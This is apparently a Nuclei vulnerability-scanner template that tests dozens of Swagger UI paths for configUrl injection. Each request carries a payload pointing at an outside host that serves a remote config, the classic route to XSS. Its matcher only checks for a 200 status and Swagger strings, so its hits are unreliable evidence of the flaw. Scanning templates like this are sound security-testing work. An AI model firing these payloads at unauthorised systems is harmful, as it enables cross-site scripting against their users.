id: swagger-ui-config-url-injection-extensive

info:
  name: Swagger UI Config URL Injection
  author: Shadowbyte
  severity: low
  description: |
    Detects if adding a `configUrl` parameter to Swagger UI endpoints leads to a successful load (HTTP 200) and presence of Swagger UI content. Includes versioned paths.
  tags: swagger-ui,xss,injection
  metadata:
    max-request: 1
    verified: true

variables:
  payload: "https://xss.smarpo.com/test.json"

http:
  - id: swagger-ui-config-injection
    method: GET
    path:
      - '{{BaseURL}}/?configUrl={{payload}}'
      - '{{BaseURL}}/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/swagger-ui?configUrl={{payload}}'
      - '{{BaseURL}}/api/?configUrl={{payload}}'
      - '{{BaseURL}}/docs/?configUrl={{payload}}'
      - '{{BaseURL}}/idm/v2/api-docs?configUrl={{payload}}'
      - '{{BaseURL}}/docs/api-reference?configUrl={{payload}}'
      - '{{BaseURL}}/swaggerui?configUrl={{payload}}'
      - '{{BaseURL}}/api/help?configUrl={{payload}}'
      - '{{BaseURL}}/doc?configUrl={{payload}}'
      - '{{BaseURL}}/api-reference?configUrl={{payload}}'
      - '{{BaseURL}}/swagger/docs/v1?configUrl={{payload}}'
      - '{{BaseURL}}/reference?configUrl={{payload}}'
      - '{{BaseURL}}/swagger/ui/index?configUrl={{payload}}'
      - '{{BaseURL}}/swagger/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/swagger-ui.html?configUrl={{payload}}'
      - '{{BaseURL}}/swagger/swagger-ui.html?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger-ui.html?configUrl={{payload}}'
      - '{{BaseURL}}/api-docs/?configUrl={{payload}}'
      - '{{BaseURL}}/api/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/api/docs/?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger/swagger-ui.html?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger-ui/api-docs?configUrl={{payload}}'
      - '{{BaseURL}}/api/api-docs?configUrl={{payload}}'
      - '{{BaseURL}}/api/apidocs?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger/static/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger-resources?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger-resources/restservices/v2/api-docs?configUrl={{payload}}'
      - '{{BaseURL}}/api/__swagger__/?configUrl={{payload}}'
      - '{{BaseURL}}/api/_swagger_/?configUrl={{payload}}'
      - '{{BaseURL}}/api/spec?configUrl={{payload}}'
      - '{{BaseURL}}/api/swagger/ui/index?configUrl={{payload}}'
      - '{{BaseURL}}/__swagger__/?configUrl={{payload}}'
      - '{{BaseURL}}/api/v2/doc?configUrl={{payload}}'
      - '{{BaseURL}}/api/v1/?configUrl={{payload}}'
      - '{{BaseURL}}/api/v1/doc?configUrl={{payload}}'
      - '{{BaseURL}}/_swagger_/?configUrl={{payload}}'
      - '{{BaseURL}}/swagger-resources/restservices/v2/api-docs?configUrl={{payload}}'
      - '{{BaseURL}}/classicapi/doc/?configUrl={{payload}}'
      - '{{BaseURL}}/api/v1/openapi?configUrl={{payload}}'
      # Versioned Swagger UI paths
      - '{{BaseURL}}/v0.12/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.11/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.10/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.9/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.8/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.7/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.6/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.5/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.4/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.3/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.2/index.html?configUrl={{payload}}'
      - '{{BaseURL}}/v0.1/index.html?configUrl={{payload}}'

    redirects: true
    max-redirects: 3

    matchers:
      - type: dsl
        name: swagger-ui-loaded
        dsl:
          - status_code == 200
          - contains(body, 'swagger-ui') || contains(body, 'swagger-initializer') || contains(body, 'swagger.json') || contains(body, 'api-docs')

